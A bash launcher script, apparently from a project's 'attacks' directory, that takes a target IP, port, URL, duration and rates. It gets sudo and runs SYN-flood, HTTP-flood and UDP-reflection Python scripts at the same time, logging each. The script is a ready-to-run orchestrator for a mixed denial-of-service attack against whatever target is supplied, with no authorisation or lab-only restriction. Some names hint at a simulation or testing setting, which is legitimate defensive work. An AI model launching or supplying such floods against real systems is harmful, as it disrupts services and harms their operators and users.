#!/usr/bin/env bash
set -Eeuo pipefail

usage() {
  cat <<'EOF'
Usage: bash attacks/run_mixed_attack.sh [options]

Options:
  --target-ip IP        Target IP.
  --target-port PORT    Target port.
  --target-url URL      Target URL.
  --duration SEC        Duration.
  --syn-rate RATE       SYN rate.
  --http-rate RATE      HTTP rate.
  --udp-rate RATE       UDP rate.
  --output-dir DIR      Log directory.
  -h, --help            Show help.

Environment:
  PYTHON                Python executable. Default: python3.
  SUDO                  sudo executable. Default: sudo. Set SUDO= to run without sudo.
EOF
}

die() {
  printf '[attack][error] %s\n' "$*" >&2
  exit 1
}

is_uint() {
  [[ "${1:-}" =~ ^[0-9]+$ ]]
}

TARGET_IP=""
TARGET_PORT=""
TARGET_URL=""
DURATION=""
SYN_RATE=""
HTTP_RATE=""
UDP_RATE=""
OUTPUT_DIR=""
PYTHON_BIN="${PYTHON:-python3}"
SUDO_BIN="${SUDO-sudo}"

while [[ $# -gt 0 ]]; do
  case "$1" in
    --target-ip)
      TARGET_IP="${2:-}"
      shift 2
      ;;
    --target-port)
      TARGET_PORT="${2:-}"
      shift 2
      ;;
    --target-url)
      TARGET_URL="${2:-}"
      shift 2
      ;;
    --duration)
      DURATION="${2:-}"
      shift 2
      ;;
    --syn-rate)
      SYN_RATE="${2:-}"
      shift 2
      ;;
    --http-rate)
      HTTP_RATE="${2:-}"
      shift 2
      ;;
    --udp-rate)
      UDP_RATE="${2:-}"
      shift 2
      ;;
    --output-dir)
      OUTPUT_DIR="${2:-}"
      shift 2
      ;;
    -h|--help)
      usage
      exit 0
      ;;
    *)
      die "Unknown option: $1"
      ;;
  esac
done

[[ -n "$TARGET_IP" && -n "$TARGET_PORT" && -n "$TARGET_URL" && -n "$DURATION" ]] || die "Missing target or duration options."
[[ -n "$SYN_RATE" && -n "$HTTP_RATE" && -n "$UDP_RATE" && -n "$OUTPUT_DIR" ]] || die "Missing rate or output options."
is_uint "$TARGET_PORT" || die "--target-port must be numeric: $TARGET_PORT"
is_uint "$DURATION" || die "--duration must be numeric: $DURATION"
is_uint "$SYN_RATE" || die "--syn-rate must be numeric: $SYN_RATE"
is_uint "$HTTP_RATE" || die "--http-rate must be numeric: $HTTP_RATE"
is_uint "$UDP_RATE" || die "--udp-rate must be numeric: $UDP_RATE"
[[ "$TARGET_PORT" -ge 1 && "$TARGET_PORT" -le 65535 ]] || die "--target-port out of range: $TARGET_PORT"
[[ "$DURATION" -ge 1 ]] || die "--duration must be greater than 0"
[[ "$SYN_RATE" -ge 1 && "$HTTP_RATE" -ge 1 && "$UDP_RATE" -ge 1 ]] || die "Rates must be greater than 0"

command -v "$PYTHON_BIN" >/dev/null 2>&1 || die "Python command not found: $PYTHON_BIN"

if [[ -n "$SUDO_BIN" && "${EUID:-$(id -u)}" -ne 0 ]]; then
  command -v "$SUDO_BIN" >/dev/null 2>&1 || die "sudo command not found: $SUDO_BIN"
  "$SUDO_BIN" -v || die "sudo authentication failed; raw packet attacks need elevated privileges"
  PRIV_CMD=("$SUDO_BIN" "$PYTHON_BIN")
else
  PRIV_CMD=("$PYTHON_BIN")
fi

mkdir -p "$OUTPUT_DIR"

"${PRIV_CMD[@]}" attacks/syn_flood.py \
  --target-ip "$TARGET_IP" \
  --target-port "$TARGET_PORT" \
  --duration "$DURATION" \
  --rate "$SYN_RATE" \
  --output "$OUTPUT_DIR/syn_flood.log" &
SYN_PID="$!"

"$PYTHON_BIN" attacks/http_flood.py \
  --target-url "$TARGET_URL" \
  --duration "$DURATION" \
  --rate "$HTTP_RATE" \
  --method GET \
  --output "$OUTPUT_DIR/http_flood.log" &
HTTP_PID="$!"

"${PRIV_CMD[@]}" attacks/udp_reflection_sim.py \
  --target-ip "$TARGET_IP" \
  --target-port "$TARGET_PORT" \
  --duration "$DURATION" \
  --rate "$UDP_RATE" \
  --output "$OUTPUT_DIR/udp_reflection.log" &
UDP_PID="$!"

status=0
for pid in "$SYN_PID" "$HTTP_PID" "$UDP_PID"; do
  if ! wait "$pid"; then
    status=1
  fi
done

exit "$status"
